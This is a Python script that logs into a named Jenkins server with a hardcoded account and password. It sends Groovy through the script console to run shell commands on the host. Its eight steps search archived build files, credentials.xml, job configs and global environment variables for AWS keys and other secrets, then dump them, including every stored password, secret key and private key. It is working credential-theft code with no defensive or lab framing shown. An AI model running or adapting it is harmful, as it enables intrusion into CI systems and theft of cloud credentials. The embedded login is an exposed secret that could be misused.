import requests
import urllib3
urllib3.disable_warnings()

JENKINS = "https://jenkins-ng.dev.claroshop.com"
USER = "eduardo.cruz"
PASS = "xwMyIxfkZZaDNkFg"

s = requests.Session()
s.auth = (USER, PASS)
s.verify = False

# Get crumb
crumb_r = s.get(f"{JENKINS}/crumbIssuer/api/json", timeout=30)
crumb_r.raise_for_status()
crumb_data = crumb_r.json()
crumb_header = crumb_data["crumbRequestField"]
crumb_value = crumb_data["crumb"]
print(f"[+] Crumb OK")


def run_groovy(script, label="", timeout=55):
    print(f"\n{'='*80}\n[*] {label}")
    resp = s.post(
        f"{JENKINS}/scriptText",
        data={"script": script, crumb_header: crumb_value},
        timeout=timeout
    )
    print(f"[+] Status: {resp.status_code} | Length: {len(resp.text)}")
    if resp.status_code == 200:
        print(resp.text)
    else:
        print(resp.text[:500])
    return resp.text if resp.status_code == 200 else ""


# Query 1: Fast bash find limited to .env files in archives + grep AWS
q1 = r'''
def proc = ["bash", "-c", "find /var/jenkins_home/jobs -maxdepth 6 -path '*/archive*' -name '*.env' 2>/dev/null | head -30"].execute()
proc.waitFor()
println proc.text
'''
run_groovy(q1, "STEP 1: Find .env files in archives (maxdepth 6)")

# Query 2: grep for AWS in those env files
q2 = r'''
def proc = ["bash", "-c", "find /var/jenkins_home/jobs -maxdepth 6 -path '*/archive*' -name '*.env' -exec grep -l -i 'AWS\\|S3\\|SECRET_KEY\\|ACCESS_KEY\\|AKIAJ' {} \\; 2>/dev/null | head -15"].execute()
proc.waitFor()
println proc.text
'''
run_groovy(q2, "STEP 2: grep .env for AWS/S3 patterns")

# Query 3: Also check credentials.xml and config.xml for AWS
q3 = r'''
def proc = ["bash", "-c", "grep -r -l -i 'AKIAJ\\|aws_access\\|aws_secret\\|AmazonS3' /var/jenkins_home/credentials.xml /var/jenkins_home/jobs/*/config.xml 2>/dev/null | head -10"].execute()
proc.waitFor()
println proc.text
'''
run_groovy(q3, "STEP 3: Check credentials.xml and job configs for AWS")

# Query 4: Dump Jenkins credentials.xml
q4 = r'''
def proc = ["bash", "-c", "cat /var/jenkins_home/credentials.xml 2>/dev/null"].execute()
proc.waitFor()
println proc.text
'''
run_groovy(q4, "STEP 4: Dump credentials.xml")

# Query 5: Use Jenkins API to list credentials
q5 = r'''
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.common.StandardCredentials
import jenkins.model.Jenkins

def creds = CredentialsProvider.lookupCredentials(StandardCredentials.class, Jenkins.instance, null, null)
creds.each { c ->
    println "${c.class.simpleName} | ID: ${c.id} | Desc: ${c.description}"
    if (c.hasProperty('secret')) { println "  SECRET: ${c.secret}" }
    if (c.hasProperty('password')) { println "  PASS: ${c.password}" }
    if (c.hasProperty('secretKey')) { println "  SECRET_KEY: ${c.secretKey}" }
    if (c.hasProperty('accessKey')) { println "  ACCESS_KEY: ${c.accessKey}" }
    if (c.hasProperty('privateKey')) { println "  PRIVATE_KEY: ${c.privateKey?.take(100)}" }
}
'''
run_groovy(q5, "STEP 5: Jenkins Credentials API dump (all stored secrets)")

# Query 6: Check env vars and global properties
q6 = r'''
import jenkins.model.Jenkins

def instance = Jenkins.instance
println "=== GLOBAL ENV VARS ==="
instance.globalNodeProperties.each { prop ->
    if (prop instanceof hudson.slaves.EnvironmentVariablesNodeProperty) {
        prop.envVars.each { k, v ->
            if (k =~ /(?i)AWS|S3|SECRET|KEY|ACCESS|TOKEN|CLOUD/) {
                println "${k} = ${v}"
            }
        }
    }
}
println "\n=== ALL GLOBAL ENV VARS ==="
instance.globalNodeProperties.each { prop ->
    if (prop instanceof hudson.slaves.EnvironmentVariablesNodeProperty) {
        prop.envVars.each { k, v -> println "${k} = ${v}" }
    }
}
'''
run_groovy(q6, "STEP 6: Global environment variables")

# Query 7: cat found .env files with AWS content
q7 = r'''
def proc = ["bash", "-c", "for f in $(find /var/jenkins_home/jobs -maxdepth 6 -path '*/archive*' -name '*.env' -exec grep -l -i 'AWS\\|S3\\|SECRET_KEY\\|ACCESS_KEY\\|AKIAJ' {} \\; 2>/dev/null | head -5); do echo \"=== $f ===\"; cat \"$f\"; echo; done"].execute()
proc.waitFor()
println proc.text
'''
run_groovy(q7, "STEP 7: Cat .env files with AWS keys")

# Query 8: Also check .properties and .yml
q8 = r'''
def proc = ["bash", "-c", "find /var/jenkins_home/jobs -maxdepth 6 -path '*/archive*' \\( -name '*.properties' -o -name '*.yml' \\) -exec grep -l -i 'AWS\\|S3\\|SECRET_KEY\\|ACCESS_KEY\\|AKIAJ' {} \\; 2>/dev/null | head -10"].execute()
proc.waitFor()
def files = proc.text.trim()
println "FILES: ${files}"
if (files) {
    files.split('\n').take(5).each { path ->
        println "\n=== ${path} ==="
        println new File(path).text.take(3000)
    }
}
'''
run_groovy(q8, "STEP 8: .properties/.yml with AWS content")
